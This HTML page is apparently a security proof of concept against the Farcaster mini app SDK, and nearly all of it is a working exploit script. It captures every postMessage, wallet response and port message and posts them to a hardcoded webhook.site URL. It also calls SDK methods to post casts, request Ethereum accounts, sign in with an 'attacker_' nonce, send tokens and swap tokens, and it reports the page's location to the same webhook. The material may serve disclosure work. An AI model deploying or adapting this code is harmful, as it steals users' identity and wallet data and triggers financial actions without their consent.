<!doctype html>
<html>
	<head>
		<meta charset="utf-8" />
		<meta name="viewport" content="width=device-width, initial-scale=1" />
		<title>Security PoC v2</title>
		<style>
			* {
				margin: 0;
				padding: 0;
				box-sizing: border-box;
			}
			body {
				font-family: -apple-system, sans-serif;
				background: #17101f;
				color: #fff;
				padding: 16px;
				font-size: 12px;
			}
			.banner {
				background: #dc2626;
				padding: 10px;
				border-radius: 8px;
				margin-bottom: 12px;
				font-weight: bold;
				text-align: center;
			}
			.card {
				background: #1e1529;
				border: 1px solid #2a2035;
				border-radius: 8px;
				padding: 10px;
				margin-bottom: 10px;
			}
			.card h3 {
				color: #a855f7;
				margin-bottom: 4px;
				font-size: 12px;
			}
			.card pre {
				color: #ccc;
				font-size: 10px;
				word-break: break-all;
				white-space: pre-wrap;
				background: #0d0912;
				padding: 6px;
				border-radius: 4px;
				margin-top: 4px;
				max-height: 250px;
				overflow-y: auto;
			}
			.pass {
				color: #4ade80;
			}
			.fail {
				color: #f87171;
			}
		</style>
	</head>
	<body>
		<div class="banner">⚠️ Farcaster Full SDK Access PoC (Registered Mini App)</div>

		<div class="card">
			<h3>📨 Messages Received</h3>
			<pre id="msg-log">Waiting...</pre>
		</div>

		<div class="card">
			<h3>🔑 SDK Responses</h3>
			<pre id="wallet-log">Waiting...</pre>
		</div>

		<div class="card">
			<h3>📡 Exfil Log</h3>
			<pre id="exfil-log">Ready...</pre>
		</div>

		<script>
			var WEBHOOK = "https://webhook.site/a9641ead-2421-404a-83bd-6be9ad1c4e60";
			var msgLog = [];
			var walletLog = [];
			var exfilLog = [];
			var msgCounter = 2000;

			function updateUI() {
				document.getElementById("msg-log").textContent = msgLog.length > 0 ? JSON.stringify(msgLog.slice(-15), null, 2) : "No messages...";
				document.getElementById("wallet-log").textContent = walletLog.length > 0 ? JSON.stringify(walletLog.slice(-15), null, 2) : "No responses...";
				document.getElementById("exfil-log").textContent = exfilLog.slice(-10).join("\n");
			}

			function sendToWebhook(label, data) {
				try {
					fetch(WEBHOOK, {
						method: "POST",
						mode: "no-cors",
						headers: { "Content-Type": "text/plain" },
						body: JSON.stringify({ label: label, data: data, ts: new Date().toISOString() }),
					});
					exfilLog.push(new Date().toISOString().substring(11, 19) + " " + label);
					updateUI();
				} catch (e) {}
			}

			// Listen for ALL messages
			window.addEventListener("message", function (event) {
				var entry = {
					origin: event.origin,
					data: JSON.stringify(event.data).substring(0, 800),
					hasPorts: !!(event.ports && event.ports.length),
					portCount: event.ports ? event.ports.length : 0,
					ts: new Date().toISOString(),
				};
				msgLog.push(entry);

				if (event.data && (event.data.id !== undefined || event.data.type)) {
					walletLog.push({
						type: "RESPONSE",
						data: JSON.stringify(event.data).substring(0, 800),
						origin: event.origin,
						ts: new Date().toISOString(),
					});
					sendToWebhook("RESPONSE", event.data);
				}

				if (event.data && event.data.type === "frameEvent") {
					sendToWebhook("FRAME_EVENT", event.data);
				}

				if (event.data && event.data.type === "frameEthProviderEvent") {
					sendToWebhook("ETH_EVENT", event.data);
				}

				// Handle port transfers
				if (event.ports && event.ports.length > 0) {
					sendToWebhook("PORTS_RECEIVED", { count: event.ports.length });
					event.ports.forEach(function (port, i) {
						port.onmessage = function (pe) {
							sendToWebhook("PORT_MSG", { portIndex: i, data: pe.data });
							updateUI();
						};
						port.start();
					});
				}

				updateUI();
			});

			// Comlink call helper
			function call(method, args) {
				var id = msgCounter++;
				window.parent.postMessage(
					{
						id: id,
						type: "APPLY",
						path: [method],
						argumentList: args || [],
					},
					"*",
				);
				sendToWebhook("CALL", { method: method, id: id });
				return id;
			}

			// =============================================
			// PHASE 1: Signal ready (2s delay for init)
			// =============================================
			setTimeout(function () {
				// Tell Farcaster we're ready — this is what legit mini apps do first
				call("ready", [{}]);
			}, 1500);

			// =============================================
			// PHASE 2: Try SDK calls with correct formats (4s)
			// =============================================
			setTimeout(function () {
				// 1. Open a URL — proves we can navigate the user
				call("openUrl", [{ url: "https://example.com" }]);

				// 2. Set the primary button text — proves UI manipulation
				call("setPrimaryButton", [{ text: "HACKED", enabled: true }]);

				// 3. View a profile — proves social actions
				call("viewProfile", [{ fid: 3 }]); // fid 3 = dwr (Dan Romero)

				// 4. Compose a cast — proves posting as user
				call("composeCast", [{ text: "Security PoC test", embeds: [] }]);

				// 5. Request ETH provider — wallet access
				call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
				call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
				call("ethProviderRequestV2", [{ method: "eth_requestAccounts", params: [] }]);

				// 6. Request context/user info
				call("getContext", []);

				// 7. Add mini app to user's favorites
				call("addMiniApp", [{}]);

				// 8. Sign in — get user's identity
				call("signIn", [{ nonce: "attacker_" + Date.now() }]);

				// 9. Send token — this would trigger wallet
				call("sendToken", [
					{
						token: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
						amount: "1",
						recipientAddress: "0x0000000000000000000000000000000000000001",
					},
				]);

				// 10. Swap token
				call("swapToken", [
					{
						sellToken: "eip155:8453/erc20:0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
						buyToken: "eip155:8453/erc20:0x4200000000000000000000000000000000000006",
					},
				]);
			}, 4000);

			// =============================================
			// PHASE 3: Retry key calls (7s)
			// =============================================
			setTimeout(function () {
				call("ethProviderRequestV2", [{ method: "eth_accounts", params: [] }]);
				call("ethProviderRequestV2", [{ method: "eth_chainId", params: [] }]);
				call("viewProfile", [{ fid: 3 }]);
			}, 7000);

			// Status checks — less frequent to avoid webhook rate limit
			var checkCount = 0;
			var checker = setInterval(function () {
				checkCount++;
				if (checkCount > 10) {
					clearInterval(checker);
					return;
				}
				sendToWebhook("status", {
					second: checkCount * 3,
					messages: msgLog.length,
					walletResponses: walletLog.length,
				});
			}, 3000);

			sendToWebhook("poc_v2_started", {
				location: window.location.href,
				referrer: document.referrer,
				isFramed: window.self !== window.top,
			});
		</script>
	</body>
</html>
